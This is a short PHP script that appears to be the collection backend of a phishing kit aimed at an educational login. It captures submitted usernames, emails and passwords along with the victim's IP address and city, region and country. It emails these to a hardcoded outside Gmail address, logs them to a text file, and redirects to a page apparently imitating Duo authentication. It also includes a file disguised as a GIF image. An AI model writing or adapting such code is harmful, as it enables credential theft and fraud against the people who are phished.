<?php

$email = $_GET['email'];
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 


$msg .= "User: ".$_POST[UserName]."\n";
$msg .= "Email: ".$_POST[doo]."\n";
$msg .= "Password: ".$_POST[password]."\n";
$msg .= "IP: $ip\n";
$msg .= "------------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "cathyh0606@gmail.com";
$subject = "~ EDURANDOM ~ $ip ~";
include_once "images/button.gif";
mail($send,$subject,$msg);

$fp = fopen("xTx2.txt","a");
fputs($fp,$msg);
fclose($fp);

header('Location: duo.php');

?>